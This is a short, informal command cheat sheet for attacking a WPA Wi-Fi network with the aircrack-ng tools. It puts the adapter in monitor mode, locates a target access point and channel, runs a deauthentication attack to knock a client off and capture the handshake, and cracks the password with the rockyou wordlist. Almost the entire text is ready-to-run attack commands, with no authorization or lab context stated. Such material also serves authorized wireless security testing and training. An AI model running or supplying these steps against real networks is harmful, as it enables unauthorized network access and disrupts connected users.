airmon-ng start wlan0

#manage --> monitor

iwconfig # to SEE

ip a

airodump-ng wlan0mon # the one with monitor mode

# copy -- (BSSID) & (CH)

airodump-ng -d (BSSID) -w file -c (CH) wlan0mon
# see which has more - frame

#split 

aireplay-ng -0 10 -a (BSSID) -c (STATION) wlan0mon

#capture handshake

cat /usr/share/wordlists - rockyou.txt

aircrack-ng -w /usr/share/wordlists/rockyou.txt file.cap

airmon-ng stop wlan0mon
systemctl restart net*